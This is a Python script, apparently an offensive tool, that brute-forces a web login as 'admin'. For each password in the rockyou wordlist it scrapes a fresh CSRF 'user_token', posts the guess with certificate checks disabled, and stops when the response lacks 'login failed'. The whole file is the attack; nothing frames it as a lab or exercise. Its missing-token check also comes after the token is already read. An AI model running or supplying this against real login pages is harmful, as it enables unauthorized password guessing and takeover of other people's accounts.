import requests
from bs4 import BeautifulSoup

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


url = input("enter ur url:")
username = "admin"
wordlist = "rockyou.txt"

session = requests.Session()

with open(wordlist,"r", encoding="latin-1") as f:
    passwords = f.readlines()

try:
    for password in passwords:
        password = password.strip()

        response = session.get(url, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        token_input = soup.find("input", {"name": "user_token"})
        csrf_token = token_input["value"]

        if not token_input:
            print("[-] CSRF token not found in page!")
            exit()

        data = {
            "username": username,
            "password": password,
            "Login": "Login",
            "user_token": csrf_token

        }

        response = session.post(url, data=data , verify=False)

        if "login failed" in response.text.lower():
            print(f"[-] tried: {password}")
        else:
            print(f"[+] found password: {password}")
            break
            
except:
    print("server disconected")